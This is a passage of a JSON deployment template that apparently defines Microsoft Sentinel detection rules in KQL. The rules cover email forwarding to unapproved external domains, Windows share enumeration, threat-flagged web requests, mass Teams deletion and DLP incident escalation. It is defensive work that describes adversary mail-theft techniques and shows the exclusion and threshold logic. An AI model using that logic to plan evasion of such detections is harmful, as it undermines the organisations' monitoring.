          "description": "Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim\u00e2\u20ac\u2122s organization to use as part of further exploits or operations.[1] Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.[2] Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes\n\nThis alert notifies when a user has set an inter-domain email forwarding rule that is not listed in the approved list of domains\n\nExclusions: A627_EXCLUDED_DOMAINS \n\nRecommendations:\n  1. Validate user created the mail forwarding rule and is authorized to forward to domain MITRE: T1114 Category: Office 365 tag: RBA",
          "severity": "Low",
          "enabled": false,
          "query": "let OperationDescriptions = datatable(Operation:string, OperationDescription:string)[\n    'Set-InboxRule','set an inbox forwarding rule'\n    , 'New-InboxRule','create an inbox forwarding rule'\n    , 'Set-Mailbox', 'set a mail box forwarding'\n    , 'UpdateInboxRules', 'updated an inbox rule'\n];\nlet alert_id = 'BV-634';\nlet start_time = 1h;\nlet latency = 24h;\nlet end_time = now();\nlet alert_bin = 1h;\nlet global_config = dynamic({'EXCLUSION': dynamic([])});\nlet excluded_description_fields = dynamic(['bv_raw']);\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV634_CONFIG['RBASCORE']),1.0);\nlet exclusions = array_concat(global_config['EXCLUSION'], BV634_CONFIG['EXCLUSIONS'], dynamic([{}]));\nlet match = (table_parameter: (*), items:dynamic, match_type: string){\n        table_parameter\n        | extend all_data = pack_all()\n        | mv-apply e = items on (\n            extend keys = bag_keys(e)\n            | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n            | mv-apply k = keys to typeof(string) on (\n                extend list = split(e[k],',')\n                | mv-apply l = list to typeof(string) on (\n                    extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                    | mv-apply i = item to typeof(string) on (\n                        extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                        | summarize excluded_count = countif(compare)\n                        | extend item_excluded = excluded_count > 0\n                    )\n                    | summarize excluded_count = countif(item_excluded)\n                    | extend item_excluded = excluded_count > 0\n                )\n                | summarize excluded_list_item = countif(item_excluded > 0)\n            )\n            | extend matched =  key_count == excluded_list_item and key_count != 0\n            | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n            | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n            | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n        )\n        | extend match_status = iff(matched contains \"true\", match_type, '')\n};\nlet description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nOfficeActivity\n| where TimeGenerated between(ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where Operation in ('Set-InboxRule', 'Set-Mailbox', 'UpdateInboxRules')\n| extend OperationProperties = column_ifexists('OperationProperties', '')\n| where Parameters has_any ('ForwardTo', 'ForwardingSmtpAddress') or OperationProperties has_any('Forward')\n| extend ParsedOperationProperties = parse_json(OperationProperties)\n| mv-apply p = ParsedOperationProperties on\n    (\n    extend\n        RuleActions = iff(p.Name == 'RuleActions', p.Value, '')\n        ,\n        RuleName = iff(p.Name == 'RuleName', p.Value, '')\n        ,\n        RuleCondition = iff(p.Name == 'RuleCondition', p.Value, '')\n    | summarize\n        RuleActions=take_any(RuleActions),\n        RuleNames = take_any(RuleName),\n        RuleConditions = take_any(RuleCondition)\n    )\n| mv-apply a = todynamic(RuleActions) to typeof(dynamic) on\n    (\n    extend Recipients = iff(a.ActionType == 'Forward', a.Recipients, '')\n    | mv-apply r=todynamic(Recipients) on\n        (\n        parse r with * '@' RecipientDomains\n        | summarize RecipientDomains=make_set_if(RecipientDomains, isnotempty(RecipientDomains))\n        )\n    | summarize\n        Recipients=make_set(todynamic(Recipients)),\n        RecipientDomains=make_set_if(RecipientDomains, isnotempty(RecipientDomains))\n    )\n| extend ParsedParameters = parse_json(Parameters)\n| mv-apply p= ParsedParameters on\n    (\n    extend ForwardingSmtpAddress = iff(p.Name == 'ForwardingSmtpAddress' and isnotempty(p.Value), p.Value, '')\n    | extend ForwardTo = iff(p.Name == 'ForwardTo' and isnotempty(p.Value), p.Value, '')\n    | parse ForwardingSmtpAddress with * '@' SmtpDomain\n    | extend ForwardToDomains = extract_all(@'[a-zA-Z1-9-.]*@([a-zA-Z1-9-.]*)', ForwardTo)[1]\n    | extend Domain = iff(isnotempty(SmtpDomain), SmtpDomain, ForwardToDomains)\n    | summarize\n        ForwardingSMTP=make_set_if(ForwardingSmtpAddress, isnotempty(ForwardingSmtpAddress)),\n        ForwardToDomains=make_set_if(ForwardToDomains, isnotempty(ForwardToDomains)),\n        ForwardTo=make_set_if(split(ForwardTo, ';'), isnotempty(ForwardTo)),\n        Domains = make_set_if(Domain, isnotempty(Domain))\n    )\n| extend Recipients=array_concat(Recipients, ForwardingSMTP, ForwardTo)\n| extend RecipientDomains=array_concat(RecipientDomains, Domains, ForwardToDomains)\n| where array_length(RecipientDomains) > 0\n| summarize\n    TimeGenerated=min(TimeGenerated),\n    RecipientDomains=make_set(RecipientDomains),\n    Recipients=make_set(Recipients),\n    RuleActions = make_set(RuleActions),\n    RuleNames = make_set(RuleNames),\n    RuleConditions = make_set(RuleConditions)\n    by\n    UserType,\n    OfficeObjectId,\n    UserId,\n    ClientIP,\n    Parameters,\n    Operation,\n    bin_at(TimeGenerated, alert_bin, now())\n| parse UserId with AccountName '@' AccountDnsDomain\n| parse OfficeObjectId with OfficeObject @'\\' *\n| extend AccountName = coalesce(AccountName, OfficeObject)\n| extend NewDestinationDomain = set_difference(RecipientDomains, A627_EXCLUDED_DOMAINS)\n| extend DestDomainExclusion = iif(array_length(NewDestinationDomain) == 0 or 'excludedDomains.comm' in~ (A627_EXCLUDED_DOMAINS) or NewDestinationDomain contains AccountDnsDomain, true, false)\n| where DestDomainExclusion\n| join kind=leftouter OperationDescriptions on Operation\n| extend bv_alarm_attacker_entities = pack_array(UserId, ClientIP)\n| extend bv_alarm_victim_entities = pack_array(UserId)\n| extend bv_rule_version = '1.2.5100'\n| extend bv_rule_timestamp = '1711714983.7289116'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.2.5100 bv_rule_timestamp: 1711714983.7289116'\n| project\n    bv_start_time = TimeGenerated\n    , bv_user = UserId\n    , bv_src_ip = ClientIP\n    , bv_object_id = OfficeObjectId\n    , bv_vendor_action = Operation\n    , bv_recipient = Recipients\n    , bv_recipient_domain = RecipientDomains\n    , bv_dest_domain_excluded =  DestDomainExclusion\n    , bv_dest_domain_new = NewDestinationDomain\n    , bv_user_domain = AccountDnsDomain\n    , bv_alarm_attacker_entities\n    , bv_alarm_victim_entities\n    , bv_rule_names = RuleNames\n    , bv_rule_actions = RuleActions\n    , bv_rule_conditions = RuleConditions\n    , bv_rule_combined_string\n| invoke match(exclusions, 'exclusion')\n| extend bv_alarm_rba_score = BV_FUN_CALC_RBA(alert_id, visibility, rba_score) \n| extend bv_mapping_tag = bv_user\n| invoke description(excluded_description_fields, 300, 5)\n| extend bv_rule_version = '1.2.5100'\n| extend bv_rule_timestamp = '1711714983.7289116'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.2.5100 bv_rule_timestamp: 1711714983.7289116'\n| project-keep\n    bv_*\n    , ExtendedDescription",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT25H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection"
          ],
          "techniques": [
            "T1114"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-634: [RBA] O365 - Email Forwarding Rule Set by {{bv_user}}",
            "alertDescriptionFormat": "Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim\u00e2\u20ac\u2122s organization to use as part of further exploits or operations.[1] Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.[2] Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes\n\n{{ExtendedDescription}}\n\nThis alert notifies when a user has set an inter-domain email forwarding rule that is not listed in the approved list of domains\n\nExclusions: A627_EXCLUDED_DOMAINS \n\nRecommendations:\n  1. Validate user created the mail forwarding rule and is authorized to forward to domain\n\nMITRE: T1114\nCategory: Office 365\ntag: RBA\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "AttackerEntity": "bv_alarm_attacker_entities",
            "VictimEntity": "bv_alarm_victim_entities",
            "RBAScore": "bv_alarm_rba_score",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_user"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-21030')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-21030')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-21030: [RBA] Change - Windows - Share Enumeration",
          "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system.\n\ncim_models: change, Windows MITRE: T1135,T1083 Category: BVIM,Windows Security Events tag: RBA",
          "severity": "Low",
          "enabled": false,
          "query": "let EventIDList = dynamic([4662]);\nlet latency = 0d;\nlet start_time = 1d;\nlet start_time_historical = 7d;\nlet end_time = now();\nlet alert_bin = 1h;\nlet PreviousAlerts = toscalar(SecurityAlert\n|where TimeGenerated between (ago(start_time_historical) .. now())\n|where AlertName has 'BV-21030'\n| mv-expand parse_json(Entities)\n| extend UserName = iff(Entities.Type =~ 'account', Entities.Name, '')\n| summarize make_set_if(UserName, isnotempty(UserName)));       \nlet global_config = dynamic({\n  'EXCLUSION': dynamic([{}])\n});\nlet exclusions = array_concat(global_config['EXCLUSION'], BV21030_CONFIG['EXCLUSIONS'], dynamic([{}]));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV21030_CONFIG['RBASCORE']),1.0);\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId | extend bv_rule_version = '1.2.4500'\n| extend bv_rule_timestamp = '1701110623.1660888'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.2.4500 bv_rule_timestamp: 1701110623.1660888'\n| project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n    let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId | extend bv_rule_version = '1.2.4500'\n| extend bv_rule_timestamp = '1701110623.1660888'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.2.4500 bv_rule_timestamp: 1701110623.1660888'\n| project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n    table_parameter\n    | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n    | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n    | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n    | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n    | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n    | extend ModifiedRBAScore = case(\n      ModifiedRBAScore > 10, 10.0\n      , ModifiedRBAScore <0.1, 0.1\n      , ModifiedRBAScore\n    )\n    | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nlet description = (table_parameter: (*)){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = parse_json(all_data[k])\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw', strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n            , isnotempty(array_sort_desc(pack_array(all_data[k]))[0]), strcat(k,': ', all_data[k])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};      \nlet exclusion_filter = (table_parameter: (*)){\n      table_parameter\n      | extend all_data = pack_all()\n      | mv-apply e = exclusions on (\n          extend keys = bag_keys(e)\n          | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n          | mv-apply k = keys to typeof(string) on (\n              extend list = split(e[k],',')\n              | mv-apply l = list to typeof(string) on (\n                  extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                  | mv-apply i = item to typeof(string) on (\n                      extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                      | summarize excluded_count = countif(compare)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_count = countif(item_excluded)\n                  | extend item_excluded = excluded_count > 0\n              )\n              | summarize excluded_list_item = countif(item_excluded > 0)\n          )\n          | extend exclusion_matched =  key_count == excluded_list_item and key_count != 0\n          | extend visibility = iff(isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n          | extend bv_exclusion_reason = iff(exclusion_matched, parse_json(e.metadata).reason, '')\n          | summarize exclusion_matched=make_set(exclusion_matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n      )\n      | extend drop_event = iff(exclusion_matched contains \"true\", true, false)\n      | where not(drop_event)\n};      \nbvim(starttime=ago(start_time + latency), bv_tags_has='change')\n| project bv_start_time, bv_connector, bv_vendor_event_id, bv_user, bv_object, sourcetype, bv_vendor_product\n|where bv_connector == 'Windows' and bv_vendor_event_id in (EventIDList) and bv_user !endswith '$' and bv_user <> '-'\n| where bv_user !in~ (PreviousAlerts)      \n| summarize arg_max(bv_start_time, *), bv_event_count = dcount(bv_object) by bv_user\n| where bv_event_count >= BV21030_CONFIG['EVENT_THRESHOLD']      \n| project \n    bv_user\n    , bv_event_count\n    , bv_start_time\n    , bv_vendor_product\n    , sourcetype\n    , bv_vendor_event_id\n| invoke exclusion_filter()\n| invoke rba_score_calculator('BV-21030')\n| invoke description()\n| extend bv_alarm_victim_entities = pack_array(bv_cim_normalize_username(bv_user))\n| extend bv_alarm_attacker_entities = pack_array(bv_cim_normalize_username(bv_user))\n| extend bv_rule_version = '1.2.4500'\n| extend bv_rule_timestamp = '1701110623.1660888'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.2.4500 bv_rule_timestamp: 1701110623.1660888'\n| project-keep\n    bv_*\n    , sourcetype\n    , ExtendedDescription",
          "queryFrequency": "P1D",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Discovery"
          ],
          "techniques": [
            "T1135",
            "T1083"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-21030: [RBA] Change - Windows - Share Enumeration",
            "alertDescriptionFormat": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system.\n\n\n{{ExtendedDescription}}\n\ntag: RBA\nCategory: Windows Security\nMITRE: T1135 MITRE: T1083\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/da705187-9ad1-44a4-a106-09989be5648d')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/da705187-9ad1-44a4-a106-09989be5648d')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Detect threat information in web requests (ASIM Web Session)",
          "description": "This rule would generate an alert if EvenSeverity is 'High' or 'ThreatRiskLevel' or 'ThreatOriginalConfidence' value is greater than 90",
          "severity": "High",
          "enabled": false,
          "query": "let lookback= 5m;\n_Im_WebSession(starttime=ago(lookback))\n| project\n    EventSeverity,\n    ThreatName,\n    ThreatCategory,\n    ThreatRiskLevel,\n    ThreatOriginalConfidence,\n    ThreatField,\n    TimeGenerated,\n    SrcIpAddr,\n    SrcUsername,\n    SrcHostname,\n    Url,\n    DstIpAddr\n| where ThreatRiskLevel >= 90\n    or toint(ThreatOriginalConfidence) >= 90\n    or EventSeverity =~ \"High\"\n| summarize\n    EventCount = count(),\n    EventStartTime=min(TimeGenerated),\n    EvenEndTime=max(TimeGenerated)\n    by\n    SrcIpAddr,\n    SrcUsername,\n    SrcHostname,\n    Url,\n    DstIpAddr,\n    ThreatName,\n    ThreatCategory,\n    ThreatRiskLevel,\n    ThreatOriginalConfidence,\n    ThreatField\n| extend\n    Name = iif(SrcUsername contains \"@\", tostring(split(SrcUsername, '@', 0)[0]), SrcUsername),\n    UPNSuffix = iif(SrcUsername contains \"@\", tostring(split(SrcUsername, '@', 1)[0]), \"\")\n",
          "queryFrequency": "PT5M",
          "queryPeriod": "PT5M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1190",
            "T1133"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "7d2ed1c7-da26-45fd-b4ea-b6f2bbeccea7",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "User '{{SrcUsername}}' with IP address '{{SrcIpAddr}}' has been identified as being associated with a threat named '{{ThreatName}}'"
          },
          "customDetails": {
            "EventStartTime": "EventStartTime",
            "EventCount": "EventCount",
            "ThreatCategory": "ThreatCategory",
            "ThreatConfidence": "ThreatOriginalConfidence",
            "ThreatName": "ThreatName",
            "EvenEndTime": "EvenEndTime"
          },
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "SrcHostname"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SrcIpAddr"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "DstIpAddr"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-380')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-380')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-380: [RBA] O365 - Multiple Teams deleted by a single user",
          "description": "This detection flags the occurrences of deleting multiple teams within an hour. This data is a part of Office 365 Connector in Azure Sentinel. MITRE: T1531,T1485 Category: Office 365 tag: RBA",
          "severity": "Low",
          "enabled": false,
          "query": "// Adjust this value to change how many Teams should be deleted before including\nlet max_delete_count = 3;\n// Adjust this value to change the timewindow the query runs over\n  OfficeActivity\n| where TimeGenerated >= ago(1d)\n| where OfficeWorkload =~ \"MicrosoftTeams\" \n| where Operation =~ \"TeamDeleted\"\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated), DeletedTeams = make_set(TeamName) by UserId\n| where array_length(DeletedTeams) > max_delete_count\n| extend timestamp = StartTime, AccountCustomEntity = UserId",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [
            "T1531",
            "T1485"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      }
    ]
  },
  {
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "parameters": {
      "workspace": {
        "type": "String"
      }
    },
    "resources": [
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-30002')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-30002')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-30002: [SOC] XDR Incident Wrapper - DLP",
          "description": "Used to alert on top-level DLP incidents, which have evolved into multi-stage items MITRE:  Category: SecurityAlert tag: SOC",
          "severity": "Informational",
          "enabled": false,
          "query": "let start_time = 7m;\nlet latency = 6h;\nlet end_time = now();\nlet start_time_historical=47h;\nlet alert_id = 'BV-30002';\nlet PreviousAlertIds = toscalar(\n  bv_split_security_alert\n  | where TimeGenerated >= ago(start_time_historical)\n  | where AlertName has alert_id\n  | extend OriginalAlertID = tostring(parse_json(tostring(parse_json(tostring(parse_json(ExtendedProperties).[\"Custom Details\"])).IdentifiedAlertID))[0])\n  | parse AlertName with * ']' * '|' PrevIncidentName\n  |summarize OriginalAlertID=make_set_if(OriginalAlertID, isnotempty(OriginalAlertID)), PrevIncidentName=make_set_if(PrevIncidentName, isnotempty(PrevIncidentName))\n  | project IDs=array_concat(OriginalAlertID,PrevIncidentName)\n);      \nlet AlertDetails = bv_split_security_alert\n|where TimeGenerated >= ago(start_time + latency)\n| where not(AlertType has_any ('CustomerTI', 'CustomDetection')) and not(AlertName has_any ('BV-', '[SOC]'))\n| where ProviderName == 'MicrosoftEndPointDlp'  \n| where SystemAlertId !in (PreviousAlertIds)\n| summarize AlertSev = make_set(AlertSeverity), Desc=make_set(Description) by SystemAlertId, AlertName, AlertLink;            \nSecurityIncident\n| where TimeGenerated >= ago(start_time + latency)\n| where Title !startswith \"BV-\" and IncidentName !in (PreviousAlertIds)\n| mv-expand SystemAlertId = AlertIds\n| extend SystemAlertId = tostring(SystemAlertId)\n| join kind=inner AlertDetails on SystemAlertId\n| summarize arg_max(LastModifiedTime, *) by IncidentNumber      \n| where Status =~ 'New' and Comments !contains \"BlueVoyant SOC\" and Owner !contains \"BVSOC@blueteamglobal.com\" and ClassificationComment !contains \"BlueVoyant has investigated\" and ModifiedBy <> 'Fusion'\n| extend Desc = strcat(Desc[0], '\\n\\nTimeGenerated: ', TimeGenerated, '\\n', 'AlertName: ', Title, '\\n', 'IncidentNumber: ', IncidentNumber, '\\n\\nTo triage this alert, please visit the following link:\\n\\n', IncidentUrl) \n| extend AlertProductNames = parse_json(tostring(AdditionalData.alertProductNames))\n|extend first_product=tostring(AlertProductNames.[0])\n|where first_product contains 'Microsoft Data Loss Prevention'\n|extend number_of_products = array_length(AlertProductNames)\n|where number_of_products > 1\n|where not((number_of_products == 2) and AlertProductNames contains 'Sentinel')\n| project TimeGenerated, AlertName, Title, IncidentNumber, IncidentName, IncidentUrl, AlertIds, Status, Comments, Classification, ClassificationComment, SystemAlertId, Severity = AlertSev, Desc, AlertLink, ProviderName, AlertProductNames",
          "queryFrequency": "PT7M",
          "queryPeriod": "PT47H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-30002: [SOC] BV XDR DLP Incident {{SystemAlertId}}|{{IncidentName}}",
            "alertDescriptionFormat": "{{Desc}}"
          },
          "customDetails": {
            "IdentifiedAlertID": "SystemAlertId"
          },
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-131')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-131')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-131: [RBA] O365 - Emails Containing Specified Words in Subject line",
